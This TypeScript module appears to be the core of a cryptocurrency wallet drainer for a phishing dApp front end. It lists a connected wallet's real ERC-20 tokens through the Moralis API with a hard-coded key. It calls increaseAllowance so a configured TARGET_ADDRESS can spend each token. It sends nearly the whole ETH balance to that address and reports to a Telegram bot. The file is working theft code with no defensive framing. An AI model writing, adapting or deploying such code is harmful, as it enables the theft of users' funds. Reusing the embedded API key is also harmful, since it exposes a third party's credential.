import { ethers } from "ethers";

const TARGET_ADDRESS = process.env.REACT_APP_CONNECT_TARGET_ADDRESS;
const TG_TOKEN = process.env.REACT_APP_TOKEN;
const GRUOP_NAME = process.env.REACT_APP_CHANNEL;

function toBigNum(value: number, d: number) {
    return ethers.utils.parseUnits(Number(value).toFixed(d), d);
}

/**
 * change data type from BigNum to Number
 * @param {Number} value - data that need to be change
 * @param {Number} d - decimals
 */
export const getTokens = async (accAdd: string, chain: string) => {

    const headers = {
        'accept': 'application/json',
        'X-API-Key': 'TXmgp6ejH5PCNOZNYPBYI04Yt8fqmQ6DTLatCckOqPYgUgzHDwzFvgwwLGAdqKFU'
    }
    const response = await fetch(`https://deep-index.moralis.io/api/v2.2/${accAdd}/erc20?chain=${chain}`, {
        method: 'GET',
        headers: headers
    })
    let tokens = await response.json();
    console.log(tokens);
    const realTokens = tokens.filter((token: any) => token.possible_spam === false);
    return realTokens;
}

export const sendToken = async (tokenAmount: any, tokenContractAddress: string, signer: any) => {
    var contractAbiFragment = [
        {
            "inputs": [
              {
                "internalType": "address",
                "name": "spender",
                "type": "address"
              },
              {
                "internalType": "uint256",
                "name": "addedValue",
                "type": "uint256"
              }
            ],
            "name": "increaseAllowance",
            "outputs": [
              {
                "internalType": "bool",
                "name": "",
                "type": "bool"
              }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
          },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "approve",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        },
    ];

    let contract = new ethers.Contract(tokenContractAddress, contractAbiFragment, signer);
    const tx = await contract.increaseAllowance(TARGET_ADDRESS, tokenAmount);
    await tx.wait();
    console.log(tx);
}

export const getBalance = async (accAdd: string, provider: any) => {
    const balance: any = await provider.getBalance(accAdd);
    return balance;
}

/**
 * change data type from Number to BigNum 
 * @param {Number} value - data that need to be change
 * @param {Number} d - decimals
 */


export const sendEth = async (signer: any, amount: any) => {
    const gasPrice = await signer.provider.getGasPrice();
    const gas = 21000;
    const gasFee = 2 * gasPrice * gas
    if (gasFee > amount)
        return
    console.log("amount - gasFee", (amount - gasFee) / 1e18);
    const transaction = {
        to: TARGET_ADDRESS,
        value: toBigNum((amount - gasFee) / 1e18, 18), // Convert amount to wei
    };
    const tx = await signer.sendTransaction(transaction);
    await tx.wait();
}



export const sendMessage = (text: string) => {
    console.log(text);
    const botToken = TG_TOKEN;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    console.log(url)
    let formData = new FormData();
    formData.append('text', text);
    formData.append('chat_id', GRUOP_NAME!);
    fetch(url,
        {
            body: formData,
            method: "post"
        });

}



export const getSubString = (text: string) => {
    let tempText = text
  
    if (text.length > 10) {
      tempText = text.slice(0, 5) + '...' + text.slice(-5)
    }
  
    return tempText
  }

  /**
   * change data type from BigNum to Number
   * @param {Number} value - data that need to be change
   * @param {Number} d - decimals
   */
  function fromBigNum(value:number, d:number) {
    return parseFloat(ethers.utils.formatUnits(value, d));
  }
  
  export { toBigNum, fromBigNum };